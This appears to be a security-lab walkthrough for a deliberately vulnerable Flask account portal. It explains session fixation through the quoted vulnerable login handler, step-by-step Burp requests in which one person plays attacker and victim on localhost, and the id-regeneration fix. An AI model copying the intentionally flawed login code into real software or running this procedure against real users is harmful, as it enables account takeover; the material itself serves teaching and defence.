# Walkthrough — session-fixation

## 1. Context

The app is a tiny account portal. `GET /` gives you a session and shows whether you're anonymous or logged in, plus a login form. `POST /login` authenticates. `GET /account` is a protected page that only an authenticated session may see. That's the whole feature. This is **A07 — session fixation**.

Two things make this atom different from every atom before it. First, it is the project's first **session** bug: identity is carried by a server-side session with an opaque `session_id` cookie, not by a header or a token you forge. Second, the attack has **two actors in two moments** — an attacker who plants a session id *before* login, and a victim who authenticates it. There is no second machine in this lab: **you play both roles**, and each step below is labelled **AS ATTACKER** or **AS VICTIM** so you always know which hat you're wearing.

Like `idor-numeric-id`, this is not an input-driven bug — there's no payload. The "exploit" is a perfectly legitimate session id, used at the wrong time. The request that does the damage is a plain `GET /account` with a valid cookie.

Track: **Burp Suite is primary** — you'll set the `Cookie` header explicitly on every request, and that hand control is exactly what lets one person hold both roles with a single id.

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py) and read `POST /login`:

```python
@app.route("/login", methods=["POST"])
def login():
    sid, sess = current_session()
    user = request.form.get("user", "")
    password = request.form.get("password", "")
    if CREDENTIALS.get(user) != password:
        abort(401)
    # VULNERABLE: authenticate the CURRENT session, keeping the SAME session_id. ...
    sess["authenticated"] = True
    sess["user"] = user
    return redirect("/account")  # cookie unchanged — the pre-login sid is now authenticated
```

The credential check is fine. The bug is what happens *after* it: the handler flips the current session to `authenticated` **in place** and returns — it never issues a new `session_id`. Ask one audit question of any login handler: **"does the session id change when the privilege level changes?"** Here the answer is *no*. The session you had while anonymous — an id anyone could have handed you — is now an *authenticated* session. That is session fixation, and the fix (section 8) is exactly the missing step: regenerate the id at login.

## 3. How sessions work in this lab

Identity is tracked by a **server-side session**: a dict `SESSIONS = {session_id: {...}}` on the server, and an opaque `session_id` cookie that carries only the id. This is the `PHPSESSID` / `JSESSIONID` pattern used by most server-side frameworks.

The app deliberately does **not** use Flask's built-in `session`. That one is a *signed client-side cookie*: the data rides in the cookie, and its value changes the moment you log in (it now encodes the authenticated user) — so it regenerates by design and has no fixed server-side id to pin. Session fixation cannot live there. It lives in server-side sessions with an id in the cookie, which is what this atom models. (More in [`DIFF.md`](./DIFF.md).)

One lab convenience: the pages print the current `session_id` on screen. Real apps don't — it's surfaced here so you can watch the id across login at a glance. In a real engagement you'd read it from the `Set-Cookie` header in Burp or from DevTools.

## 4. Baseline — the app working

Point your browser at Burp and visit <http://127.0.0.1:8015/>, then send requests to Repeater. First the legitimate flow, so you know what "normal" looks like.

`GET /` with no cookie:

```
GET / HTTP/1.1
Host: 127.0.0.1:8015
```

Response — the server mints a session and hands you the id:

```
HTTP/1.1 200 OK
Set-Cookie: session_id=-bAZaAFCANLXt_Ze85jW-FeHTyeemYigp14LuwPabso; HttpOnly; Path=/; SameSite=Lax
...
Status: anonymous (not logged in)
Your session id: -bAZaAFCANLXt_Ze85jW-FeHTyeemYigp14LuwPabso
```

(Your id will differ — session ids are random `secrets.token_urlsafe(32)` values. What matters below is never the value, only whether it *changes*.) Log in and visit `/account` and you get alice's page. Normal, legitimate use.

## 5. Exploitation via Burp Suite (primary track)

Now the attack, in three beats. Because you set the `Cookie` header by hand on every request, you can act as the attacker, then the victim, then the attacker again — all carrying one session id.

### Step 1 — AS ATTACKER (part 1): grab a session id

Send `GET /` with **no cookie** and read the `Set-Cookie` in the response:

```
GET / HTTP/1.1
Host: 127.0.0.1:8015
```

```
HTTP/1.1 200 OK
Set-Cookie: session_id=-bAZaAFCANLXt_Ze85jW-FeHTyeemYigp14LuwPabso; HttpOnly; Path=/; SameSite=Lax
```

Call this value **SID_A**. It's an ordinary anonymous session — the server hands one to anybody. In a real attack this is the id you'd **plant** in the victim's browser before they log in (a crafted URL, a subdomain cookie, an XSS `document.cookie` write). Here you just note it. Nothing has been broken: grabbing an anonymous id is allowed.

### Step 2 — AS VICTIM: authenticate SID_A

Switch hats. The victim logs in **normally, with her own password**, in a session that happens to carry SID_A. Set the cookie to SID_A and post the real credentials:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8015
Cookie: session_id=-bAZaAFCANLXt_Ze85jW-FeHTyeemYigp14LuwPabso
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

user=alice&password=password123
```

```
HTTP/1.1 302 FOUND
Location: /account
```

Look at the response headers: **there is no `Set-Cookie`.** The server authenticated the session but left the id alone. Confirm by reading `/account` with the same cookie:

```
GET /account HTTP/1.1
Host: 127.0.0.1:8015
Cookie: session_id=-bAZaAFCANLXt_Ze85jW-FeHTyeemYigp14LuwPabso
```

```
HTTP/1.1 200 OK
...
Signed in as alice.
Your session id: -bAZaAFCANLXt_Ze85jW-FeHTyeemYigp14LuwPabso
```

**KEY PROOF:** the session id is **SID_A before login and SID_A after login** — byte for byte. The victim did everything right (her account, her password), but the id that now identifies her *authenticated* session is the one from step 1.

### Step 3 — AS ATTACKER (part 2): enter the authenticated session

Back to the attacker. In a **separate** request — the attacker's own context, which only ever knew SID_A — hit the protected page:

```
GET /account HTTP/1.1
Host: 127.0.0.1:8015
Cookie: session_id=-bAZaAFCANLXt_Ze85jW-FeHTyeemYigp14LuwPabso
```

```
HTTP/1.1 200 OK
...
Signed in as alice.
Email: alice@example.test · Plan: Pro · Balance: $4,200.00
```

You're inside alice's authenticated account. You never submitted her password, never saw it, never guessed anything. You handed her an id, she logged in, and the id you already held is now hers-authenticated. That is session fixation.

## 6. What the vuln is NOT

This step isolates the cause and clears away the look-alikes. Each is checkable in Repeater.

- **It is NOT guessing the session id.** The id is `secrets.token_urlsafe(32)` — 256 bits of randomness, unguessable. You didn't guess it; the server *handed* it to you in step 1. A weak, predictable id would be a *different* bug; here the id is strong and the bug is that it survives login.
- **It is NOT cracking or knowing the password.** The victim typed her own correct password in step 2. Your traffic, as the attacker, was only `GET /` (step 1) and `GET /account` (step 3) — you never sent a credential. The login was 100% legitimate.
- **It is NOT session hijacking.** Hijacking *steals* an already-authenticated id, *after* login (sniffing, XSS reading the cookie). You did the opposite: you *supplied* an id *before* login and let the victim authenticate it. You never read her authenticated cookie — you held the id since before she logged in. Direction (give vs take) and timing (before vs after) are the whole difference.
- **It is NOT a cookie-flag problem.** Look again at the `Set-Cookie` in step 1: `HttpOnly; SameSite=Lax` are already there — and the attack still worked. Those flags stop cookie *theft* (hijacking); they do nothing against fixation, because you never needed to read the victim's cookie. You can't "fix" this by adding `HttpOnly`; it's already on. (`Secure` is omitted only because the lab is plain HTTP; it too is irrelevant to fixation.)
- **And the server doesn't blindly adopt any id you invent.** Send `GET /` with `Cookie: session_id=made_up_by_me` — the response `Set-Cookie`s a *fresh* server-generated id, not your invented one. The server only ever fixates ids **it** issued. So the single surface is non-regeneration at login, nothing else.

What it **is**, surgically: the session id is the same before and after login (SID_A == SID_A). Change that one fact and the attack dies — which is exactly what the fix does.

## 7. Impact

Session capture / account takeover. With one planted session id and zero knowledge of the victim's password, the attacker ends up inside the victim's authenticated session — reading her account, acting as her. It is **not** RCE, and the attacker never learns the password; the power comes entirely from riding a session the victim elevated on the attacker's behalf.

## 8. Why the fix works (port 8115)

Run the same three beats against the fixed app at <http://127.0.0.1:8115/>.

- **Step 1 (attacker):** `GET /` → an anonymous id, same as before. Call it SID_A (in this run, `s8lxO7-5QDEfHj7Dwb3ie0rSEXt1868kjG0Rz0a1YC0`).
- **Step 2 (victim):** `POST /login` with `Cookie: session_id=SID_A` and alice's password → `302`, but this time the response carries a **`Set-Cookie` with a brand-new id**:

```
HTTP/1.1 302 FOUND
Location: /account
Set-Cookie: session_id=K2TKaBYp48f8Z0e8rDKPNpHFjGSF8UcNbCGmUeBT8PM; HttpOnly; Path=/; SameSite=Lax
```

The id changed at login: SID_A → **SID_B**. The victim's authenticated session lives under SID_B, which the attacker has never seen.

- **Step 3 (attacker):** replay `GET /account` with the planted `Cookie: session_id=SID_A`:

```
HTTP/1.1 302 FOUND
Location: /
```

Redirected to the login page — no account. SID_A was **discarded** at login (the fixed app `del`etes it), so it identifies nothing. Confirm the discard: `GET /` with `Cookie: session_id=SID_A` now makes the server mint yet another fresh id instead of reusing SID_A — the planted id is gone from the store entirely.

Everything else is identical — same endpoints, same templates, same strong `secrets.token_urlsafe` ids, same cookie flags. The single change is that the fixed `/login` **regenerates** the session id at the moment of authentication. See [`DIFF.md`](./DIFF.md).
